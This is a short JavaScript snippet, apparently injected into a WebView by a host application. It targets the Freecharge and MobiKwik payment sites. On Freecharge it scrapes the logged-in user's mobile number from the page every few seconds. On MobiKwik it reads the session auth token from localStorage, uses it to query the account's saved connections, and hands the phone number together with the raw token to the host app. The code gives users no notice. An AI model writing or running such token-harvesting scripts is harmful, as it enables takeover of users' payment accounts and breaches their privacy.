console.info("This is a self-invoking function 2" + window.location.href);
(function () {
    // Your code here
    console.info("This is a self-invoking function " + window.location.href);
    if (window.location.href.startsWith("https://www.freecharge.in")) {
        console.info("freecharge");
        var pho = '';
        setInterval(function () {
            try {
                var mas = /"fullProfileDetails":([\s\S]*?),"isFullProfileDetailsFetched/.exec(document.documentElement.innerHTML);
                console.info("Get mobileNo 1", mas);
                var ph = JSON.parse(mas[1]).mobileNo;
                console.info("Get mobileNo 2", ph);
                if (ph) {
                    if (pho != ph) {
                        var res = xamlAction.invokeAction('otheruserlogged', ph);
                        console.info("Get mobileNo ret ", res);
                        pho = ph;
                    }
                }
            } catch (e) {
                console.info("Get mobileNo ex", e);
            }
        }, 3000);
    } else if (window.location.href.startsWith("https://www.mobikwik.com")) {
        console.info("mobikwik");
        var pho = '';
        setInterval(function () {
            try {
                var tok = localStorage._token;
                console.info("localStorage._token", tok);
                if (tok) {
                    var url = "https://rapi.mobikwik.com/recharge/connections?categoryId=mobile";
                    var token = localStorage._token.replace(/^"|"$/g, '');

                    fetch(url, {
                        headers: {
                            "Authorization": token,
                            "X-MClient": 0,
                        }
                    })
                        .then(response => { console.info("resss", response); return response.json() })
                        .then(data => {
                            // Handle the response data here

                            var ph = data.data.savedConnections[0].cn;
                            console.info("Get mobileNo 2", ph);
                            if (ph) {
                                if (pho != ph) {
                                    var res = xamlAction.invokeAction('otheruserlogged', ph + '|' + token);
                                    console.info("Get mobileNo ret ", res);
                                    pho = ph;
                                }
                            }
                        })
                        .catch(error => {
                            // Handle any errors here
                            console.info("getress err", error);
                        });
                }
            } catch (e) {
                console.info("Get mobileNo ex", e);
            }
        }, 3000);
    }
})();